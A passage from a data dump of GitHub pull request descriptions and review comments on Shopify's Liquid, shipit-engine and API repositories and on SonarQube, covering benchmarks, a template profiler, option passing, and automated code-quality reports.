   2422900  (29.5%)      238800   (2.9%)     block in Liquid::Block#create_variable
    204800   (2.5%)      204800   (2.5%)     Liquid::StandardFilters#truncatewords
    146100   (1.8%)      143500   (1.7%)     Liquid::For#lax_parse
   7262000  (88.4%)      108700   (1.3%)     Liquid::Block#render_all
    600600   (7.3%)       98500   (1.2%)     Liquid::Context#invoke
     70700   (0.9%)       70700   (0.9%)     Liquid::Block#block_delimiter
     54300   (0.7%)       54000   (0.7%)     Liquid::Context#initialize
  10764400 (131.1%)       47600   (0.6%)     Liquid::Tag.parse
     47000   (0.6%)       47000   (0.6%)     block in Liquid::Context#find_variable
```

So, down 591,600 objects (6.72%) and better by ~150ms. And simple :-)

@camilo, @fw42, @dylanahsmith ","[':+1: I like this. Add yourself to History.md please.', 'cc @Shopify/liquid ', '@jasonhl you are part of /liquid so you can page all the team on PRs', 'I like it too :sparkles: ', '> I like this. Add yourself to History.md please.\r\n\r\n@fw42 Do we really need every change in History.md?  We have the git commit log in case someone wants to see every change that is made between releases.  I think the History.md file should focus on bug fixes, features, deprecations and backwards incompatible changes.', 'Yeah fair enough', 'LGTM', '@dylanahsmith: Implemented your suggestion to cache first and rest instead of the whole array. Also added the check to see if it is ""square_bracketed"" into the cached object, which is now a hash. Saved a few more objects -- benchmark is down to 8159200.\r\n\r\nCan you take another quick look?', 'Changed it to use Hash constructor with block as suggested by @dylanahsmith.', 'can you repost the benchs for science?', 'I will...once everyone is happy with it.', 'LGTM', ""With all the edits, CPU benchmark hasn't changed much (still ~150ms better).\r\n\r\nObject is down a bit more:\r\n```\r\n==================================\r\n  Mode: object(1)\r\n  Samples: 8171200 (0.00% miss rate)\r\n  GC: 0 (0.00%)\r\n==================================\r\n     TOTAL    (pct)     SAMPLES    (pct)     FRAME\r\n   2185900  (26.8%)     1433400  (17.5%)     Liquid::Variable#lax_parse\r\n  10194700 (124.8%)      806100   (9.9%)     Liquid::Block#parse\r\n    752500   (9.2%)      752500   (9.2%)     block in Liquid::Variable#lax_parse\r\n    625200   (7.7%)      625200   (7.7%)     Liquid::Context#variable_parse\r\n   2944500  (36.0%)      521600   (6.4%)     Liquid::Block#create_variable\r\n    438600   (5.4%)      438600   (5.4%)     Liquid::Template#tokenize\r\n    480300   (5.9%)      433300   (5.3%)     Liquid::Context#find_variable\r\n   1716000  (21.0%)      421100   (5.2%)     Liquid::Context#resolve\r\n   2521700  (30.9%)      300600   (3.7%)     Liquid::Variable#render\r\n   1053600  (12.9%)      295500   (3.6%)     block in Liquid::Variable#render\r\n    289100   (3.5%)      289100   (3.5%)     Liquid::If#lax_parse\r\n   2422900  (29.7%)      238800   (2.9%)     block in Liquid::Block#create_variable\r\n    204800   (2.5%)      204800   (2.5%)     Liquid::StandardFilters#truncatewords\r\n    146100   (1.8%)      143500   (1.8%)     Liquid::For#lax_parse\r\n    131300   (1.6%)      131300   (1.6%)     block in Liquid::Context#variable\r\n   7068300  (86.5%)      108700   (1.3%)     Liquid::Block#render_all\r\n    600600   (7.4%)       98500   (1.2%)     Liquid::Context#invoke\r\n     70700   (0.9%)       70700   (0.9%)     Liquid::Block#block_delimiter\r\n     66300   (0.8%)       66000   (0.8%)     Liquid::Context#initialize\r\n    683300   (8.4%)       58100   (0.7%)     block in Liquid::Context#initialize\r\n```""]"
117,Shopify/liquid,401.0,"There is no progress in https://github.com/Shopify/liquid/pull/358, but I would like to merge it. This PR addresses the code review comments.

@arthurnn @jasonhl, could you review this? Please read the original PR description first so you know what's up with the whole global filter thing.

cc @dylanahsmith @ktdreyer

Closes #358 ","['Jason is on vacation. @christianblais, would you review please?', 'Couple of comments, but otherwise looks good.']"
118,Shopify/liquid,364.0,"This is an improved version of what I originally put together in #361

This PR adds a simple profiling system to liquid rendering. Each liquid tag ({{ }} and {% %}) is processed through this profiling, keeping track of the partial name (in the case of {% include %}), line number, and the time it took to render the tag. In the case of {% include %} and any tag that requires blocks (like {% if %} and {% for %}), the tags inside of the partials and blocks are themselves marked as children in the final profiling structure, letting any user of this information view top level information and to dive down into more details. With this, it's now possible to track down exactly which tags are taking a long time to render.

Included in this PR are internal changes to parsing to calculate and keep track of the line numbers of individual tags and tokens in the source, as well as some specific tracking of the current partial, such that using the include tag will be tracked as a nested render. I initially looked into adding this information to error exceptions but that was proving more complicated and would require quite a few changes to how tags handle syntax errors.

I was able to hook profiling into Liquid through one small refactoring (`Block#render_token`) and alias method chain-like hooks into the appropriate classes, significantly reducing the code impact on the core Liquid code base. There are also changes to parsing to figure out the line numbers of the tokens, Template to start up a profiling pass, and to Tags and Variables for easier output of the contents of these items when printing out the profiled information, but otherwise the actual profiling is kept separate.  The hooks install and uninstall themselves as needed, which ensures that if profiling is turned off that there is no performance impact.

The current profiling runs for these changes can be found here: https://gist.github.com/jasonroelofs/79bde3d22ede168a5ae8

I've also put together an example template and resulting profiling output here: https://gist.github.com/jasonroelofs/c8148317ffb09e541633

If you prefer not to have this in the core I would love to discuss what changes Liquid does need for this functionality to live as its own gem and hooking into Liquid when needed.","[""Had an idea on how to make the profiling hooks install/uninstall themselves and from my testing it works, so now profiling only impacts the liquid execution times when it's turned on."", 'cc @camilo ', ""The performance hit without profiling doesn't seem too crazy. Worth investigating I would say...\r\n\r\n@Shopify/liquid @jstorimer "", 'Fixed JRuby build on travis, it was running too quickly and giving a 0s time for the test node.\r\n\r\nNo more `#raw` monkey patch on String.\r\n\r\nWhat would you like to see as the flag for turning on profiling?', ""Simplified the failing test so JRuby passes more reliably (hopefully). I've also changed the enabling hook to be:\r\n\r\n```ruby\r\ntemplate.render({}, :profile => true)\r\n```"", 'Rebased with master.', '@jasonhl, could you review this?', ""Be happy to...\r\n\r\n@jasonroelofs: Can I ask you to rerun the profiles/benchmarks? The GC percentages being reported in the ones you posted are very high ( 20-30% ) to the point where I'm not sure if your numbers are reliable. Not sure why you are getting so much GC, but if you can get it below 10% or so, then I'd have more confidence in the numbers.\r\n\r\nAlso, if you could run and post an object allocation profile, that would be great. I recently patched the Liquid profile to do that in #381. "", ""I think this looks very promising. Thanks for doing this @jasonroelofs.\r\n\r\nIf it's reasonably easy, can I request adding a total time to the output? If that's not too hard, then it would also be cool to enhance the output with a percentage of the total. So, a line which now reads:\r\n\r\n```\r\nsite.title -- 'header':3 -- 0.000305\r\n```\r\n\r\nCould read:\r\n```\r\nsite.title -- 'header':3 -- 0.000305 (3.7%)\r\n```\r\n\r\nWhere 3.7% would be the percentage of the total template time taken by that element."", ""Rebased and updated the commit with an updated API for the Timing object.\r\n\r\nAlso @jasonhl I've run the new profiling with the results here https://gist.github.com/jasonroelofs/83e10a2890a2f0955c2f. I have not made any attempt to clean up the GC on this profiling run yet. I will look into that."", ""I've updated the code to make a few changes:\r\n\r\n* Profiling is now flagged via `Template.parse` and the line number counting is appropriately flagged\r\n* Removed the monkey-patch on `String` and went back to `Liquid::Token`\r\n\r\nThe new profiles are here: https://gist.github.com/jasonroelofs/e59dddcf9c4012cc5d02\r\n\r\nI made this a separate commit to make it easy to revert if another direction is better. Can squash as needed."", ""@jasonroelofs: Sorry for the delayed reply -- was on vacation.\r\n\r\nThis looks much better, thank you. There appears to be no perf hit when profiling is disabled, which will be 99.9% of the time.\r\n\r\nThere is a test failure which needs to be cleaned up, but once that's done, I say :+1: for this one."", ""@jasonhl Awesome. I've just pushed some final changes.\r\n\r\n* Rebased with master and fixed to use Minitest\r\n* Squashed the two commits back down to one.\r\n* Added a total render time calculation to Profiler\r\n* Updated documentation on how to use the Profiler with Template."", ""Beautiful. I'm all good with this, once tests pass.\r\n\r\n@fw42, @arthurnn: Mind taking one last look?"", ""Hmmm I'm not a huge fan of the way you hook into Liquid (monkey patching the methods in, running the code, then removing the monkey patch)"", 'Can you rebase because of the merge conflicts?', '@fw42 As for the hooks, I had previously built this where the profiling hooks where embedded directly into the objects and that felt quite messy. I do understand the concern about hooking and unhooking, and as the hooks themselves do make sure a profiler is running, would that be ok to just load the hooks at load time and leave them in place?', '* Rebased with master\r\n* Profiling hooks installed at load time\r\n* Protect the profiling code to always end on exceptions\r\n\r\nNew benchmarking runs with the changes from master: https://gist.github.com/jasonroelofs/1137f4f59ed7657ccc96', 'LGTM!', 'I think this is good to go. @jasonhl or @dylanahsmith, any other concerns? If not, I will merge.', '@trishume can you review this PR please so that we can ship asap?', "":+1: Looks good.\r\n\r\nI'm interested in why this PR doesn't come with a Rake task to run the profiler on the benchmark templates and print the output. I know there is already a profiler, but a rake task for this would be another handy tool. But that can be done in a separate PR."", ""I'm good with it. :+1:\r\n\r\nThanks again, @jasonroelofs."", 'Awesome and thanks!']"
119,Shopify/liquid,425.0,"Pass template parse options down through include tags. This will make them use the correct parser, as well as respect profiling and (eventually) line number options.

This PR can supersede #420 since it solves the same problem (I also included the test from there). It solves it in a way that is more general and also is easier to integrate with #419.

@fw42 @jasonroelofs ","['Cool :+1: ', ':+1: ', 'Hmmm, I just thought of one implication of this. I might want to add another option for only single level strict parsing. \r\n\r\nIf this is merged as-is then Shopify/shopify#25887 will show warnings on included templates as well as the current one.', 'Good point', 'ok', 'Good to merge?', '@dylanahsmith, can you think of any unintended side-effects this might have?', ""We probably want to pass down the `:locale` option, even if we don't want to pass down the strict parsing option.\r\n\r\nShould we just allow a `:include_options` hash to be specified in the options, which would allow preventing specific options from being passed down to included templates?  We can then re-use the `:include_options` hash for each included template, and even set the `included: true` on that hash to make sure it doesn't recursively look for `:include_options`."", ""How's that @dylanahsmith? I added the ability to pass an Array to :dont_include_options and it will delete all those options before passing the options on."", '@fw42 think this is ready to merge?', 'Cool, looks good to me', 'Fixed @dylanahsmith. Good to go?', 'I still had a concern about the name of the option name: https://github.com/Shopify/liquid/pull/425#discussion_r16676474', 'Agree that the name is not obvious enough.\r\n\r\nOther than that, looks good to me.', 'Fixed. :shipit:?', 'Dylan was talking about the name of the option, not the name of the test', 'Ok. How about `:include_options_blacklist`?', 'sounds good to me', 'Done.', ':+1: ', ':+1:']"
120,Shopify/liquid,486.0,*sigh*,"['what do you mean by exponential time?', '@fw42 every call to `warnings` was calling the next level twice, so each level deep would be 2^level times total.', ""Good catch. I don't think we necessarily need a test for this (they are gonna be fragile anyway)"", '@fw42 hmmm maybe, this is the kind of thing someone will ""fix"" in the future without realizing', 'I think leaving the test in with no time assertion is also an option \xe2\x80\x93\xc2\xa0if this happens again then the test will basically never finish, otherwise it will always pass.', 'is it a lot of work input vs expected calls test? useless?', 'You could [spy](https://github.com/ryanong/spy) (```and_call_through```) and assert that the method was called a certain number of times', '@fw42 and expect not 2^n for an input, I think is worth since we know it can cause trouble', 'Note:\r\n\r\n2^20 = 1048576 ops\r\n2^100 = 1267650600228229401496703205376 ops\r\n\r\nSo, I think the test should be fairly effective as-is.', 'Good catch.  Sorry that I missed that.', 'LGTM']"
121,Shopify/shipit-engine,429.0,"Fixes: https://github.com/Shopify/shipit-engine/issues/426

This is still an heavy work in progress, but I think I solved the architectural issues. I'll continue the work on this tomorrow.

@wvanbergen @dalehamel FYI.","[""@gmalette @davidcornu @rafaelfranca I believe this is good to go (There is one test that fail on CI but I'll figure that out soonish).\r\n\r\nHere's what it look like:\r\n\r\n![capture d ecran 2015-06-29 a 14 27 48](https://cloud.githubusercontent.com/assets/44640/8415194/0e0c7b7c-1e6b-11e5-87df-0a2aeb41a83d.png)\r\n\r\nThe output is streamed using the same code than for deploys, and the status is reflected by the border color: yellow: in progress, red: failed, green: success.\r\n\r\nOne thing we might need to add in a followup is a retry button.\r\n\r\n@wvanbergen @dalehamel thoughts?"", 'Should we collapse non-stdout or something? @dalehamel for your specific case, what does the checks look like?', ""> Should we collapse non-stdout or something? \r\n\r\n[Buildkite's terminal](http://buildkite.github.io/terminal/) have an interesting feature: it recognize `---` and `+++` as commands to collapse the output. We might do something similar later, but I think this will do for now."", ""@byroot @gmalette this looks conceptually good - how many checks can we define? Each is just one command, displayed separately?\r\n\r\nI think showing both stderr and stdout has merit. \r\n\r\n@gmalette our use case is that we'd like to use shipit for infrastructure (building AWS instances, etc), but we want to preview the changes before we actually apply them. This can be done in CI as well, but things might change between CI and actually shipping."", '> how many checks can we define? Each is just one command, displayed separately?\r\n\r\nAs much as you want, they will be executed sequentially until one returns a non-zero status or that all have been successfully executed.', '```\r\nOffenses:\r\napp/jobs/perform_commit_checks_job.rb:2:22: C: Space inside parentheses detected.\r\n  def perform(commit: )\r\n                     ^\r\napp/models/commit_checks.rb:62:38: C: Space inside parentheses detected.\r\n  def build_commands(commands, chdir: )\r\n```\r\n\r\n:trollface: ', '@byroot Does displaying this page create a deploy lock? Or is is potentially possible to have a bunch of people requesting this page at the same time, and/or somebody else deploying when showing this page?', ""> Does displaying this page create a deploy lock? Or is is potentially possible to have a bunch of people requesting this page at the same time, and/or somebody else deploying when showing this page?\r\n\r\n@wvanbergen yes this page is totally independent from a deploy. The commands are executed in a temporary clone of the stack.\r\n\r\nIf 2 people are visualizing this page for the same commit at the same, they'll share the output, but that's all.\r\n"", 're: rubocop\r\n\r\nI prefer having a trailing space after required keyword arguments but that might just be me\r\n\r\n```ruby\r\ndef my_method(required_arg: )\r\n                           ^\r\n```', 'Some minor concerns around lazy-loading the command output but overall LGTM.', ""LGTM. I didn't :tophat: but I saw this was using `OutputStream` which means it'll have colorization, right?"", ""> which means it'll have colorization, right?\r\n\r\nIndeed."", ""@davidcornu 5a7b782 refactored `CommitChecks`. I think you'll like it better.\r\n\r\nI'll merge on green CI.\r\n\r\nOne last thing, as of now these checks only execute for deploys, meaning not for rollbacks. Not sure if they should as you don't want to delay rollbacks too much. But if you think they should let me know I can add them."", ':heart: :sparkles: :heart: \r\n\r\n:clap: \r\n\r\n:gift: \r\n\r\n:tada: ', ""> @davidcornu 5a7b782 refactored `CommitChecks`. I think you'll like it better.\r\n\r\n:+1:""]"
122,Shopify/shopify_api,80.0,"@maartenvg @costford 
@dtKinger @jonasll 

Changes
=======
* Added url creation helper methods
* updated the readme and tested the getting started procedure
* updated several links to point to the appropriate doc page

Notes - merge after #79 ","['It might help to check out the readme on the actual branch:\r\nhttps://github.com/Shopify/shopify_api/tree/updating_readme', 'buncha humble wording suggestions\r\n:sailboat: ', 'Can I get another review on this now? and can someone from docs give the readme a read through? Thanks!', ""It all looks good to me. You guys know better than I for the content but\r\nthe structure looks good. One little thing (doesn't need to be changed at\r\nthis time) is your links reference api.shopify.com for tech docs and the\r\nlinks are good, but the actual home now is docs.shopify.com/api\r\n\r\nGood work, Kevin!\r\n\r\n\r\nOn Thu, Dec 5, 2013 at 2:35 PM, Kevin Hughes <notifications@github.com>wrote:\r\n\r\n> Can I get another review on this now? and can someone from docs give the\r\n> readme a read through? Thanks!\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/Shopify/shopify_api/pull/80#issuecomment-29929857>\r\n> .\r\n>\r\n\r\n\r\n\r\n-- \r\nDan King\r\nDocumentation Coordinator\r\n@dtKinger\r\ndaniel.king@jadedpixel.com"", ""Thanks for reading, I'll update that link in this PR, might as well!\r\n*edit* we're going to keep the link as is"", ':eggplant: :octopus: ']"
123,Shopify/shopify_app,148.0,"Fixes #134 (I'm 99% sure)

Fixes a session glitch where another return_to URL would be stored from a previous request by the same browser

cc @kevinhughes27 ","['Tweaked @kevinhughes27 how is this?', ':+1: ignore my other comment this works since we only call `return_address` when we are done an oauth flow (or exit early)', ""cool I also moved to a `.delete` and didn't `nil` it out anymore""]"
124,SonarSource/sonarqube,218.0,"This PR : 
* changes the WS response to use a root object so that the response can be easily extended in the future (best practice)
* adds more properties to the WS response for each plugin


","['The ruby WS api/updatecenter/installed_plugins is still implemented and available. It should be dropped.  ', 'droping a ROR webservice requires to answer the question of its support as deprecated service and it has been decided with Fabrice that a specific JIRA will be created for each old WS', 'Decided with @fmallet the opposite: please remove the Ruby on Rails WS. No intermediary deprecated status. ', 'ok\r\n\r\nI will remove the old WS in a separate JIRA and PR for SOC though', '@simonbrandhof updated PR:\r\n\r\n* remove the ""-"" in version\r\n* add support to disable serialization of empty String to JSON in JsonWriter (review welcome on this one)\r\n* no more fields with empty string are displayed in JSON', 'No need for a separate JIRA ticket for removal of old ruby WS.', 'PR updated according to comments', 'just added a commit to the PR to add the name of the jar to the JSON response for consistency with other plugin WebServices and also, as this information can be useful to match listed plugins to the content of `extensions/plugins` directory', 'LGTM if ""archive"" is renamed ""artifact""']"
125,SonarSource/sonarqube,236.0,,"['Please apply my feedback', 'Last minor feedback to apply then LGTM !', ""Last info : the package-info.java file is missing in 'src/main/java/org/sonar/server/ui/ws' !""]"
126,SonarSource/sonarqube,253.0,"this PR modifies the WS code to aggregate PluginUpdate objects from UpdateCenter so that the WS sends out information in the target format (multiple release per plugin object instead of one plugin for each release)

also, it modifies the unit test to test the sample response instead of some other json response specific to the unit test","['PE updated to take comments into account and rebase on master', 'LGTM']"
127,SonarSource/sonarqube,299.0,"* split `UserSession` into `ThreadLocalUserSession` and `ServerUserSession`, former is responsible of using a ThreadLocal to retrieve the current session, later is responsible for the dao related logic, both implement `UserSession` interface
* reworked `MockUserSession` to drop dao mocks and introduced `AnonumousMockUserSession`
* introduced `UserSessionRule` (itself a `UserSession`) with support for `ServerTest` to integrate nicely with the `ThreadLocalUserSession` instance in the pico container",[]
128,SonarSource/sonarqube,324.0,"this PR:
* introduces the Component tree to be used by computing steps in CE
* adds a step to generate QP events
* does not yet persists the computed steps","[""SonarQube analysis reported 10 new issues:\n* 1 critical\n* 7 major\n* 1 minor\n* 1 info\n\nDetails:\n* Do not forget to remove this deprecated code someday. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1133)\n* Add the missing @deprecated Javadoc tag. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AMissingDeprecatedCheck)\n* Rename this class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS2176)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/Component.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Method 'ComputationContext.getDbClient(...)' is deprecated. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3ACallToDeprecatedMethod)\n* Reduce this anonymous class number of lines from 24 to at most 20, or make it a named class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1188)\n* Reduce this anonymous class number of lines from 26 to at most 20, or make it a named class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentTreeBuilders.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1188)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Possible null pointer dereference in org.sonar.server.computation.step.QualityProfileEventsStep.executeForProject(Component) due to return value of called method (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/step/QualityProfileEventsStep.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=findbugs%3ANP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE)\n"", ""SonarQube analysis reported 8 new issues:\n* 1 critical\n* 5 major\n* 1 minor\n* 1 info\n\nDetails:\n* Rename this class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS2176)\n* Do not forget to remove this deprecated code someday. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1133)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/Component.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Method 'ComputationContext.getDbClient(...)' is deprecated. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3ACallToDeprecatedMethod)\n* Reduce this anonymous class number of lines from 24 to at most 20, or make it a named class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1188)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Possible null pointer dereference in org.sonar.server.computation.step.QualityProfileEventsStep.executeForProject(Component) due to return value of called method (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/step/QualityProfileEventsStep.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=findbugs%3ANP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE)\n"", ""SonarQube analysis reported 11 new issues:\n* 1 critical\n* 5 major\n* 4 minor\n* 1 info\n\nDetails:\n* Rename this class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS2176)\n* Do not forget to remove this deprecated code someday. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1133)\n* Remove this duplicated import. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationService.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AUselessImportCheck)\n* Remove this duplicated import. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationService.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AUselessImportCheck)\n* Remove this unused import 'javax.annotation.Nullable'. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationService.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AUselessImportCheck)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/Component.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Reduce this anonymous class number of lines from 24 to at most 20, or make it a named class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1188)\n* Method 'ComputationContext.getDbClient(...)' is deprecated. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3ACallToDeprecatedMethod)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Possible null pointer dereference in org.sonar.server.computation.step.QualityProfileEventsStep.executeForProject(Component) due to return value of called method (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/step/QualityProfileEventsStep.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=findbugs%3ANP_NULL_ON_SOME_PATH_FROM_RETURN_VALUE)\n"", 'LGTM', ""SonarQube analysis reported 11 new issues:\n* 1 critical\n* 5 major\n* 4 minor\n* 1 info\n\nDetails:\n* Rename this class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS2176)\n* Do not forget to remove this deprecated code someday. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationContext.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1133)\n* Remove this duplicated import. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationService.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AUselessImportCheck)\n* Remove this unused import 'javax.annotation.Nullable'. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationService.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AUselessImportCheck)\n* Remove this duplicated import. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/ComputationService.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AUselessImportCheck)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/Component.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Method 'ComputationContext.getDbClient(...)' is deprecated. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3ACallToDeprecatedMethod)\n* Reduce this anonymous class number of lines from 24 to at most 20, or make it a named class. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/component/ComponentImpl.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1188)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Take the required action to fix the issue indicated by this comment. (org.codehaus.sonar:sonar-server:src/main/java/org/sonar/server/computation/measure/MeasureRepository.java) [![rule](https://raw.githubusercontent.com/SonarCommunity/sonar-github/master/images/rule.png)](http://nemo.sonarqube.org/coding_rules#rule_key=squid%3AS1134)\n* Possible null pointer dereference in org.sonar.server.computation.step.QualityProfileEventsStep.executeForProject(Component) due to return value of called method 